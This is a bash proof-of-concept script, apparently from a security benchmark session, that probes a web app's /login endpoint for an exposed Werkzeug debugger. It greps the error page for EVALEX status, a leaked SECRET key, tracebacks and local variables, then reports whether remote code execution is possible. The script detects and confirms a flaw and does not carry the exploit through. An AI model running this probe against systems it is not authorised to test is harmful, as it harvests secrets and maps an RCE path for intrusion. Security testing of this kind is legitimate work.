#!/bin/bash
# POC: Demonstrates Werkzeug debugger vulnerability with EVALEX enabled and exposed SECRET key allowing RCE
# Target: ./repo
# Created: 2025-11-06T19:18:07.144Z
# Session: benchmark-XBEN-032-24-mhnsyr54

# Werkzeug Debugger RCE POC
# Tests for enabled debugger with EVALEX and exposed SECRET key

TARGET="${1:-http://localhost:80}"
ENDPOINT="/login"

echo "[*] Werkzeug Debugger RCE POC"
echo "[*] Target: $TARGET"
echo ""

# Trigger an exception by sending empty POST data to /login
echo "[+] Triggering exception on $TARGET$ENDPOINT"
RESPONSE=$(curl -s -X POST "$TARGET$ENDPOINT" -d "" -H "Content-Type: application/x-www-form-urlencoded")

# Check if debugger is present in response
if echo "$RESPONSE" | grep -q "werkzeug"; then
    echo "[+] Werkzeug debugger detected in response"
    
    # Extract EVALEX status
    if echo "$RESPONSE" | grep -q "EVALEX = true"; then
        echo "[!] CRITICAL: EVALEX is ENABLED"
        EVALEX_ENABLED=1
    else
        echo "[-] EVALEX appears disabled"
        EVALEX_ENABLED=0
    fi
    
    # Extract SECRET key
    SECRET=$(echo "$RESPONSE" | grep -oP "SECRET = ['\"]?\K[^'\"]+(?=['\"]?)" | head -1)
    if [ -n "$SECRET" ]; then
        echo "[!] CRITICAL: SECRET key exposed: $SECRET"
        SECRET_EXPOSED=1
    else
        # Try alternative pattern
        SECRET=$(echo "$RESPONSE" | grep -oP "'secret': u?'?\K[^']+(?=')" | head -1)
        if [ -n "$SECRET" ]; then
            echo "[!] CRITICAL: SECRET key exposed: $SECRET"
            SECRET_EXPOSED=1
        else
            echo "[-] No SECRET key found in response"
            SECRET_EXPOSED=0
        fi
    fi
    
    # Check for full traceback and source code
    if echo "$RESPONSE" | grep -q "Traceback"; then
        echo "[!] Full traceback with source code exposed"
        TRACEBACK_EXPOSED=1
    else
        echo "[-] Traceback not found"
        TRACEBACK_EXPOSED=0
    fi
    
    # Check for local variables
    if echo "$RESPONSE" | grep -q "local variables"; then
        echo "[!] Local variables exposed in debugger"
        LOCALS_EXPOSED=1
    else
        echo "[-] Local variables section not detected"
        LOCALS_EXPOSED=0
    fi
    
    # Summary
    echo ""
    echo "[*] ===== VULNERABILITY SUMMARY ====="
    echo "[*] Debugger Enabled: YES"
    echo "[*] EVALEX Enabled: $([ $EVALEX_ENABLED -eq 1 ] && echo 'YES - CRITICAL' || echo 'NO')"
    echo "[*] SECRET Exposed: $([ $SECRET_EXPOSED -eq 1 ] && echo 'YES - CRITICAL ($SECRET)' || echo 'NO')"
    echo "[*] Traceback Exposed: $([ $TRACEBACK_EXPOSED -eq 1 ] && echo 'YES' || echo 'NO')"
    echo "[*] Locals Exposed: $([ $LOCALS_EXPOSED -eq 1 ] && echo 'YES' || echo 'NO')"
    echo ""
    
    # Determine overall status
    if [ $EVALEX_ENABLED -eq 1 ] && [ $SECRET_EXPOSED -eq 1 ]; then
        echo "[!] RESULT: CRITICAL - Debugger RCE vulnerability confirmed!"
        echo "[!] Attacker can use SECRET key to execute arbitrary Python code"
        exit 0
    else
        echo "[*] RESULT: Debugger present but full exploitation chain incomplete"
        exit 1
    fi
else
    echo "[-] Werkzeug debugger not detected in response"
    echo "[-] Response preview (first 500 chars):"
    echo "$RESPONSE" | head -c 500
    echo ""
    exit 2
fi